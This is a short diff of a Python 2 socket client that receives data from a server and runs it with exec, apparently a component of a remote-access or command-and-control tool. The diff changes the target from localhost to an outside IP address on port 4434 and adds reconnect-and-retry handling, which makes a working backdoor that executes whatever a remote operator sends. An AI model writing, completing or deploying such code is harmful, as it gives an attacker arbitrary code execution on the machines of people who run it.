@@ -15,7 +15,8 @@ import sched
 import datetime
 import zlib
 
-HOST = '127.0.0.1'
+HOST = '109.172.189.74'
+#HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
 GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,10 +38,18 @@ while 1:
                 continue
         try:
             ACTIVE = True
+
+            # TODO: SOURCE
             exec received_data
+            # TODO: END SOURCE
+
         except Exception as e:
-            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
+            print e
             ACTIVE = False
+            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
+            GLOBAL_SOCKET.close()
+            del GLOBAL_SOCKET
+            GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             time.sleep(60)
     except socket.error:
         time.sleep(5)
